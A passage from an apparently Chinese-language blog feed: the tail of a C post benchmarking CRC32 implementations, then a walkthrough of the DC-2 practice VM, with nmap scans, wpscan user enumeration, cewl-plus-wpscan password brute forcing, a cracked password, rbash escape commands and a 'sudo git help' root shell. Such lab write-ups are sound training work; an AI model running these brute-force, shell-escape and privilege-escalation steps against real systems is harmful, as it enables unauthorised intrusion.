CRC32!&quot;,&quot;Satisfaction&quot;,&quot;Technology&quot;,&quot;Wonderful&quot;,&quot;Efficiency&quot;,&quot;Innovation&quot;,&quot;Destination&quot;,&quot;Championship&quot;,</span></span><br><span class="line"><span class="comment">//&quot;Celebration&quot;,&quot;Experience&quot;,&quot;Adventure&quot;,&quot;Inspiration&quot;,&quot;Leadership&quot;,&quot;Motivation&quot;,&quot;Creativity&quot;,&quot;Opportunity&quot;,</span></span><br><span class="line"><span class="comment">//&quot;Progressive&quot;,&quot;Collaboration&quot;,&quot;Entrepreneur&quot;,&quot;Revolution&quot;,&quot;Transformation&quot;&#125;;</span></span><br><span class="line"><span class="comment">//int i = 0;</span></span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 21; i++)&#123;</span></span><br><span class="line"><span class="comment">//int len = strlen(&amp;*(str+i));</span></span><br><span class="line"><span class="comment">//crc32_table_res = crc32(&amp;*(str+i), len);</span></span><br><span class="line"><span class="comment">//printf(&quot;Hello, CRC32!：%X\n&quot;, crc32_table_res);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">clock_t</span> begin, end;</span><br><span class="line"><span class="type">double</span> cost;</span><br><span class="line">begin = clock();</span><br><span class="line"><span class="comment">//char* str = &quot;Hello, CRC32!&quot;;</span></span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Life is too short to spend time with people who suck the happiness out of you. If someone wants you in their life, they’ll make room for you. You shouldn’t have to fight for a spot. Never, ever insist yourself to someone who continuously overlooks your worth. And remember, it’s not the people that stand by your side when you’re at your best, but the ones who stand beside you when you’re at your worst that are your true friends.&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="type">uint32_t</span> crc = crc32(str, len);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">crc = crc32(str, len);</span><br><span class="line">end = clock();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, CRC32!：%X\n&quot;</span>, crc);</span><br><span class="line">cost = (<span class="type">double</span>)(end - begin)/CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;constant CLOCKS_PER_SEC is: %ld\n, time cost is: %lf secs\n&quot;</span>, CLOCKS_PER_SEC, cost);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查表法"><a href="#查表法" class="headerlink" title="查表法"></a>查表法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> poly = <span class="number">0x04C11DB7</span>;  <span class="comment">//多项式函数 </span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> crc32_table[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x04c11db7</span>, <span class="number">0x09823b6e</span>, <span class="number">0x0d4326d9</span>, <span class="number">0x130476dc</span>, <span class="number">0x17c56b6b</span>, <span class="number">0x1a864db2</span>, <span class="number">0x1e475005</span>,</span><br><span class="line"><span class="number">0x2608edb8</span>, <span class="number">0x22c9f00f</span>, <span class="number">0x2f8ad6d6</span>, <span class="number">0x2b4bcb61</span>, <span class="number">0x350c9b64</span>, <span class="number">0x31cd86d3</span>, <span class="number">0x3c8ea00a</span>, <span class="number">0x384fbdbd</span>,</span><br><span class="line"><span class="number">0x4c11db70</span>, <span class="number">0x48d0c6c7</span>, <span class="number">0x4593e01e</span>, <span class="number">0x4152fda9</span>, <span class="number">0x5f15adac</span>, <span class="number">0x5bd4b01b</span>, <span class="number">0x569796c2</span>, <span class="number">0x52568b75</span>,</span><br><span class="line"><span class="number">0x6a1936c8</span>, <span class="number">0x6ed82b7f</span>, <span class="number">0x639b0da6</span>, <span class="number">0x675a1011</span>, <span class="number">0x791d4014</span>, <span class="number">0x7ddc5da3</span>, <span class="number">0x709f7b7a</span>, <span class="number">0x745e66cd</span>,</span><br><span class="line"><span class="number">0x9823b6e0</span>, <span class="number">0x9ce2ab57</span>, <span class="number">0x91a18d8e</span>, <span class="number">0x95609039</span>, <span class="number">0x8b27c03c</span>, <span class="number">0x8fe6dd8b</span>, <span class="number">0x82a5fb52</span>, <span class="number">0x8664e6e5</span>,</span><br><span class="line"><span class="number">0xbe2b5b58</span>, <span class="number">0xbaea46ef</span>, <span class="number">0xb7a96036</span>, <span class="number">0xb3687d81</span>, <span class="number">0xad2f2d84</span>, <span class="number">0xa9ee3033</span>, <span class="number">0xa4ad16ea</span>, <span class="number">0xa06c0b5d</span>,</span><br><span class="line"><span class="number">0xd4326d90</span>, <span class="number">0xd0f37027</span>, <span class="number">0xddb056fe</span>, <span class="number">0xd9714b49</span>, <span class="number">0xc7361b4c</span>, <span class="number">0xc3f706fb</span>, <span class="number">0xceb42022</span>, <span class="number">0xca753d95</span>,</span><br><span class="line"><span class="number">0xf23a8028</span>, <span class="number">0xf6fb9d9f</span>, <span class="number">0xfbb8bb46</span>, <span class="number">0xff79a6f1</span>, <span class="number">0xe13ef6f4</span>, <span class="number">0xe5ffeb43</span>, <span class="number">0xe8bccd9a</span>, <span class="number">0xec7dd02d</span>,</span><br><span class="line"><span class="number">0x34867077</span>, <span class="number">0x30476dc0</span>, <span class="number">0x3d044b19</span>, <span class="number">0x39c556ae</span>, <span class="number">0x278206ab</span>, <span class="number">0x23431b1c</span>, <span class="number">0x2e003dc5</span>, <span class="number">0x2ac12072</span>,</span><br><span class="line"><span class="number">0x128e9dcf</span>, <span class="number">0x164f8078</span>, <span class="number">0x1b0ca6a1</span>, <span class="number">0x1fcdbb16</span>, <span class="number">0x018aeb13</span>, <span class="number">0x054bf6a4</span>, <span class="number">0x0808d07d</span>, <span class="number">0x0cc9cdca</span>,</span><br><span class="line"><span class="number">0x7897ab07</span>, <span class="number">0x7c56b6b0</span>, <span class="number">0x71159069</span>, <span class="number">0x75d48dde</span>, <span class="number">0x6b93dddb</span>, <span class="number">0x6f52c06c</span>, <span class="number">0x6211e6b5</span>, <span class="number">0x66d0fb02</span>,</span><br><span class="line"><span class="number">0x5e9f46bf</span>, <span class="number">0x5a5e5b08</span>, <span class="number">0x571d7dd1</span>, <span class="number">0x53dc6066</span>, <span class="number">0x4d9b3063</span>, <span class="number">0x495a2dd4</span>, <span class="number">0x44190b0d</span>, <span class="number">0x40d816ba</span>,</span><br><span class="line"><span class="number">0xaca5c697</span>, <span class="number">0xa864db20</span>, <span class="number">0xa527fdf9</span>, <span class="number">0xa1e6e04e</span>, <span class="number">0xbfa1b04b</span>, <span class="number">0xbb60adfc</span>, <span class="number">0xb6238b25</span>, <span class="number">0xb2e29692</span>,</span><br><span class="line"><span class="number">0x8aad2b2f</span>, <span class="number">0x8e6c3698</span>, <span class="number">0x832f1041</span>, <span class="number">0x87ee0df6</span>, <span class="number">0x99a95df3</span>, <span class="number">0x9d684044</span>, <span class="number">0x902b669d</span>, <span class="number">0x94ea7b2a</span>,</span><br><span class="line"><span class="number">0xe0b41de7</span>, <span class="number">0xe4750050</span>, <span class="number">0xe9362689</span>, <span class="number">0xedf73b3e</span>, <span class="number">0xf3b06b3b</span>, <span class="number">0xf771768c</span>, <span class="number">0xfa325055</span>, <span class="number">0xfef34de2</span>,</span><br><span class="line"><span class="number">0xc6bcf05f</span>, <span class="number">0xc27dede8</span>, <span class="number">0xcf3ecb31</span>, <span class="number">0xcbffd686</span>, <span class="number">0xd5b88683</span>, <span class="number">0xd1799b34</span>, <span class="number">0xdc3abded</span>, <span class="number">0xd8fba05a</span>,</span><br><span class="line"><span class="number">0x690ce0ee</span>, <span class="number">0x6dcdfd59</span>, <span class="number">0x608edb80</span>, <span class="number">0x644fc637</span>, <span class="number">0x7a089632</span>, <span class="number">0x7ec98b85</span>, <span class="number">0x738aad5c</span>, <span class="number">0x774bb0eb</span>,</span><br><span class="line"><span class="number">0x4f040d56</span>, <span class="number">0x4bc510e1</span>, <span class="number">0x46863638</span>, <span class="number">0x42472b8f</span>, <span class="number">0x5c007b8a</span>, <span class="number">0x58c1663d</span>, <span class="number">0x558240e4</span>, <span class="number">0x51435d53</span>,</span><br><span class="line"><span class="number">0x251d3b9e</span>, <span class="number">0x21dc2629</span>, <span class="number">0x2c9f00f0</span>, <span class="number">0x285e1d47</span>, <span class="number">0x36194d42</span>, <span class="number">0x32d850f5</span>, <span class="number">0x3f9b762c</span>, <span class="number">0x3b5a6b9b</span>,</span><br><span class="line"><span class="number">0x0315d626</span>, <span class="number">0x07d4cb91</span>, <span class="number">0x0a97ed48</span>, <span class="number">0x0e56f0ff</span>, <span class="number">0x1011a0fa</span>, <span class="number">0x14d0bd4d</span>, <span class="number">0x19939b94</span>, <span class="number">0x1d528623</span>,</span><br><span class="line"><span class="number">0xf12f560e</span>, <span class="number">0xf5ee4bb9</span>, <span class="number">0xf8ad6d60</span>, <span class="number">0xfc6c70d7</span>, <span class="number">0xe22b20d2</span>, <span class="number">0xe6ea3d65</span>, <span class="number">0xeba91bbc</span>, <span class="number">0xef68060b</span>,</span><br><span class="line"><span class="number">0xd727bbb6</span>, <span class="number">0xd3e6a601</span>, <span class="number">0xdea580d8</span>, <span class="number">0xda649d6f</span>, <span class="number">0xc423cd6a</span>, <span class="number">0xc0e2d0dd</span>, <span class="number">0xcda1f604</span>, <span class="number">0xc960ebb3</span>,</span><br><span class="line"><span class="number">0xbd3e8d7e</span>, <span class="number">0xb9ff90c9</span>, <span class="number">0xb4bcb610</span>, <span class="number">0xb07daba7</span>, <span class="number">0xae3afba2</span>, <span class="number">0xaafbe615</span>, <span class="number">0xa7b8c0cc</span>, <span class="number">0xa379dd7b</span>,</span><br><span class="line"><span class="number">0x9b3660c6</span>, <span class="number">0x9ff77d71</span>, <span class="number">0x92b45ba8</span>, <span class="number">0x9675461f</span>, <span class="number">0x8832161a</span>, <span class="number">0x8cf30bad</span>, <span class="number">0x81b02d74</span>, <span class="number">0x857130c3</span>,</span><br><span class="line"><span class="number">0x5d8a9099</span>, <span class="number">0x594b8d2e</span>, <span class="number">0x5408abf7</span>, <span class="number">0x50c9b640</span>, <span class="number">0x4e8ee645</span>, <span class="number">0x4a4ffbf2</span>, <span class="number">0x470cdd2b</span>, <span class="number">0x43cdc09c</span>,</span><br><span class="line"><span class="number">0x7b827d21</span>, <span class="number">0x7f436096</span>, <span class="number">0x7200464f</span>, <span class="number">0x76c15bf8</span>, <span class="number">0x68860bfd</span>, <span class="number">0x6c47164a</span>, <span class="number">0x61043093</span>, <span class="number">0x65c52d24</span>,</span><br><span class="line"><span class="number">0x119b4be9</span>, <span class="number">0x155a565e</span>, <span class="number">0x18197087</span>, <span class="number">0x1cd86d30</span>, <span class="number">0x029f3d35</span>, <span class="number">0x065e2082</span>, <span class="number">0x0b1d065b</span>, <span class="number">0x0fdc1bec</span>,</span><br><span class="line"><span class="number">0x3793a651</span>, <span class="number">0x3352bbe6</span>, <span class="number">0x3e119d3f</span>, <span class="number">0x3ad08088</span>, <span class="number">0x2497d08d</span>, <span class="number">0x2056cd3a</span>, <span class="number">0x2d15ebe3</span>, <span class="number">0x29d4f654</span>,</span><br><span class="line"><span class="number">0xc5a92679</span>, <span class="number">0xc1683bce</span>, <span class="number">0xcc2b1d17</span>, <span class="number">0xc8ea00a0</span>, <span class="number">0xd6ad50a5</span>, <span class="number">0xd26c4d12</span>, <span class="number">0xdf2f6bcb</span>, <span class="number">0xdbee767c</span>,</span><br><span class="line"><span class="number">0xe3a1cbc1</span>, <span class="number">0xe760d676</span>, <span class="number">0xea23f0af</span>, <span class="number">0xeee2ed18</span>, <span class="number">0xf0a5bd1d</span>, <span class="number">0xf464a0aa</span>, <span class="number">0xf9278673</span>, <span class="number">0xfde69bc4</span>,</span><br><span class="line"><span class="number">0x89b8fd09</span>, <span class="number">0x8d79e0be</span>, <span class="number">0x803ac667</span>, <span class="number">0x84fbdbd0</span>, <span class="number">0x9abc8bd5</span>, <span class="number">0x9e7d9662</span>, <span class="number">0x933eb0bb</span>, <span class="number">0x97ffad0c</span>,</span><br><span class="line"><span class="number">0xafb010b1</span>, <span class="number">0xab710d06</span>, <span class="number">0xa6322bdf</span>, <span class="number">0xa2f33668</span>, <span class="number">0xbcb4666d</span>, <span class="number">0xb8757bda</span>, <span class="number">0xb5365d03</span>, <span class="number">0xb1f740b4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">//生成CRC_32_Table </span></span><br><span class="line"><span class="comment">void generate_crc32_table() &#123;</span></span><br><span class="line"><span class="comment">uint32_t tmp = 0;</span></span><br><span class="line"><span class="comment">uint32_t i, j;</span></span><br><span class="line"><span class="comment">//uint32_t data = 0xffffffff; //初始化寄存器</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; 256; i++) &#123;</span></span><br><span class="line"><span class="comment">tmp = i &lt;&lt; 24;</span></span><br><span class="line"><span class="comment">for (j = 0; j &lt; 8; j++) &#123;</span></span><br><span class="line"><span class="comment">if (tmp &amp; 0x80000000) </span></span><br><span class="line"><span class="comment">tmp = (tmp &lt;&lt; 1) ^ poly;</span></span><br><span class="line"><span class="comment">else </span></span><br><span class="line"><span class="comment">tmp &lt;&lt;= 1;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">crc32_table[i] = tmp;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; 256; i++) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;0x%X, &quot;,crc32_table[i]);</span></span><br><span class="line"><span class="comment">if ((i + 1) % 8 == 0) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">crc32</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> data = <span class="number">0xffffffff</span>; <span class="comment">//初始化寄存器 </span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">data = ((data &amp; <span class="number">0x00ffffff</span>) &lt;&lt; <span class="number">8</span>)  ^ crc32_table[(data &gt;&gt; <span class="number">24</span>) ^ (str[i]) &amp; <span class="number">0xff</span>];</span><br><span class="line"><span class="comment">//前面是保留处理后的字节 </span></span><br><span class="line"><span class="comment">//后面由高位向低位处理，然后下标需要右移24位来处理 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data ^ <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//生成CRC32表 </span></span><br><span class="line"><span class="comment">//generate_crc32_table();</span></span><br><span class="line"><span class="type">clock_t</span> begin, end;</span><br><span class="line"><span class="type">double</span> cost;</span><br><span class="line">begin = clock();</span><br><span class="line"><span class="type">uint32_t</span> crc32_table_res = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Life is too short to spend time with people who suck the happiness out of you. If someone wants you in their life, they’ll make room for you. You shouldn’t have to fight for a spot. Never, ever insist yourself to someone who continuously overlooks your worth. And remember, it’s not the people that stand by your side when you’re at your best, but the ones who stand beside you when you’re at your worst that are your true friends.&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)&#123;</span><br><span class="line">crc32_table_res = crc32(str, len);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">end = clock();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, CRC32!：%X\n&quot;</span>, crc32_table_res);</span><br><span class="line">cost = (<span class="type">double</span>)(end - begin)/CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;constant CLOCKS_PER_SEC is: %ld\n, time cost is: %lf secs\n&quot;</span>, CLOCKS_PER_SEC, cost);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2024/03/20/DC-2/"/>
      <url>/2024/03/20/DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p><p><strong>本靶场环境总共有5个flag</strong></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或者</span><br><span class="line">netdiscover -r 192.168.174.0/24  --排除1，2，254</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314135521954.png" alt="image-20240314135521954"></p><p>得到目标IP：<strong>192.168.174.146</strong></p><p>kali的IP：<strong>192.168.174.137</strong></p><h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -sV -O -A -p- 192.168.174.146</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:0E:ED:A2 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                 </span><br></pre></td></tr></table></figure><ul><li>80端口</li><li>7744，开放了openSSH</li></ul><h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314135853539.png" alt="image-20240314135853539"></p><blockquote><p>发现访问不了，且发现我们输入的ip地址自动转化为了域名，我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。</p><p>修改hosts文件，添加靶机IP到域名dc-2的指向</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.174.146 dc-2</span><br></pre></td></tr></table></figure><p>重新访问</p></blockquote><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314140312356.png" alt="image-20240314140312356"></p><p>可以发现是一个登陆界面。返回DC-2，可以找到flag1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314140401597.png" alt="image-20240314140401597"></p><p>翻译</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">你通常的单词表可能不起作用，所以，也许你只需要保持清醒。</span><br><span class="line">密码越多越好，但有时你就是不可能一网打尽。</span><br><span class="line">以一个人的身份登录以查看下一个标志。</span><br><span class="line">如果找不到，请以另一个用户登录。</span><br></pre></td></tr></table></figure><h3 id="1-4-用户名枚举"><a href="#1-4-用户名枚举" class="headerlink" title="1.4. 用户名枚举"></a>1.4. 用户名枚举</h3><p>前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描<br>Wpscan一些常用语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2</span><br><span class="line">wpscan --url http://dc-2 --enumerate t 扫描主题</span><br><span class="line">wpscan --url http://dc-2 --enumerate p 扫描插件</span><br><span class="line">wpscan --url http://dc-2 --enumerate u 枚举用户</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314141231744.png" alt="image-20240314141231744"></p><p>wp版本为4.7.10</p><p>登录页面尝试登录<br>随即输入用户名密码，提示用户名不存在，似乎可以进行用户名枚举</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314141933222.png" alt="image-20240314141933222"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u 枚举用户</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314142010991.png" alt="image-20240314142010991"></p><p>发现有3个用户admin、jerry、tom</p><h3 id="1-5-暴力破解出账号密码"><a href="#1-5-暴力破解出账号密码" class="headerlink" title="1.5. 暴力破解出账号密码"></a>1.5. 暴力破解出账号密码</h3><p>根据flag1可以用暴力破解，我们使用cewl生成字典，使用wpscan进行暴力破解。</p><p>cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2 &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --passwords 1.txt</span><br></pre></td></tr></table></figure><p>破出来两个账号</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314142434933.png" alt="image-20240314142434933"></p><p>拿jerry登陆试试</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314142520431.png" alt="image-20240314142520431"></p><h3 id="1-6-flag2"><a href="#1-6-flag2" class="headerlink" title="1.6. flag2"></a>1.6. flag2</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314142604407.png" alt="image-20240314142604407"></p><p>找其它进入点？</p><h3 id="1-7-在tom的家目录发现flag3"><a href="#1-7-在tom的家目录发现flag3" class="headerlink" title="1.7. 在tom的家目录发现flag3"></a>1.7. 在tom的家目录发现flag3</h3><p>登录ssh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.174.146 -p 7744 </span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314143018899.png" alt="image-20240314143018899"></p><p>在tom账号的家目录 发现flag3<br>cat用不了，我这里采用了vi来查看，当前&#x3D;也可以反弹一个shell到kali</p><p>poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p><p>可怜的老汤姆总是追着杰瑞跑。也许他应该为自己造成的压力而死。</p><p>接下来，尝试<a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`</span><br><span class="line">export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</span><br><span class="line">echo /*</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314143828274.png" alt="image-20240314143828274"></p><h3 id="1-8-jeryy-flag4"><a href="#1-8-jeryy-flag4" class="headerlink" title="1.8. jeryy flag4"></a>1.8. jeryy flag4</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314144630088.png" alt="image-20240314144630088"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you &quot; re not home yet .</span><br><span class="line">很高兴看到你走了这么远，但你还没回家。</span><br><span class="line">You still need to get the final flag (the only flag that really counts!!! ).</span><br><span class="line">您仍然需要获得最后的标志(唯一真正重要的标志！)</span><br><span class="line">No hints here 一you&#x27;re on your own now. :- )</span><br><span class="line">这里没有暗示，一，你现在只能靠自己了。*-)</span><br><span class="line">Go on</span><br><span class="line">继续</span><br><span class="line">git outta here!!!!</span><br></pre></td></tr></table></figure><p>大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权</p><p>我们可以看到无需root权限，jerry 可以使用 git</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l jerry #登陆</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314153951516.png" alt="image-20240314153951516"></p><h3 id="1-9-提权"><a href="#1-9-提权" class="headerlink" title="1.9.提权"></a>1.9.提权</h3><p>查看一下可以使用的root权限命令</p><p>查找系统所有文件中拥有suid特殊权限的文件<br>-perm匹配权限<br>4000 2000 1000分别表示SUID SGID SBIT<br>1.普通文件，文件的权限一般三位，777最高文件权限-perm -0777搜索的就是最高权限的文件rwxrwxrwx-perm +0777搜索的只要包含rwxrwxrwx任意一个的文件2.特殊文件，包含权限位置四位，7000为最高，即-s-s-t，同样的方法-perm -7000搜索的就是最高权限的文件-s-s-t-perm +7000搜索的只要包含-s-s-t任意一个的文件，-s–(4000)、–s-(2000)、—t(1000)等</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314154328064.png" alt="image-20240314154328064"></p><p>sudo可以使用，但是不能到root权限(可以尝试jerry的用户)<br>在使用su jerry (密码：adipiscing)</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314154511107.png" alt="image-20240314154511107"></p><p>jerry用户也不可以直接sudo su</p><p>补充：<a href="https://blog.csdn.net/mutou990/article/details/107724302">su知识</a></p><p><strong>[sudo su] 切换root身份，不携带当前用户环境变量。</strong><br><strong>[sudo su -]切换root身份，携带当前用户环境变量。</strong></p><p>发现可以使用git命令 (root权限)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo git help status </span><br></pre></td></tr></table></figure><p>输入!&#x2F;bin&#x2F;sh，直接输入就行</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314160001335.png" alt="image-20240314160001335"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314160021137.png" alt="image-20240314160021137"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240314160050788.png" alt="image-20240314160050788"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2024/03/20/DC-1/"/>
      <url>/2024/03/20/DC-1/</url>
      
